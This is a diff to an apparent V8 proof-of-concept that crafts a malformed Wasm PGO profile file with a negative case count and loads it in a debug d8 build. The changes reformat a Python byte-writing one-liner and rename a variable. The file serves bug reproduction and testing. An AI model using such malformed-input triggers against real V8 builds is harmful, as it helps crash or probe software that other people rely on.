@@ -21,7 +21,10 @@
 //   (prints something like: Dumping Wasm PGO data to file 'profile-wasm-abcd1234')
 //
 // Step 2 - overwrite with malformed PGO (negative num_cases), then load:
-//   python3 -c "open('profile-wasm-XXXXXXXX','wb').write(bytes([0x01,0x00,0x01,0x7F]))"
+//   python3 -c "
+//   with open('profile-wasm-XXXXXXXX', 'wb') as f:
+//       f.write(bytearray([0x01, 0x00, 0x01, 0x7F]))
+//   "
 //   out/x64.debug/d8 --experimental-wasm-pgo-from-file poc-pgo-negative-num-cases.js
 //
 // Replace 'profile-wasm-XXXXXXXX' with the filename printed in Step 1.
@@ -41,6 +44,6 @@ d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
 // (no imports so func_index 0 is the first declared function)
 const builder = new WasmModuleBuilder();
 builder.addFunction('f', kSig_v_v).addBody([]).exportFunc();
-const bytes = builder.toBuffer();
-const mod = new WebAssembly.Module(bytes);
+const moduleBytes = builder.toBuffer();
+const mod = new WebAssembly.Module(moduleBytes);
 new WebAssembly.Instance(mod, {});
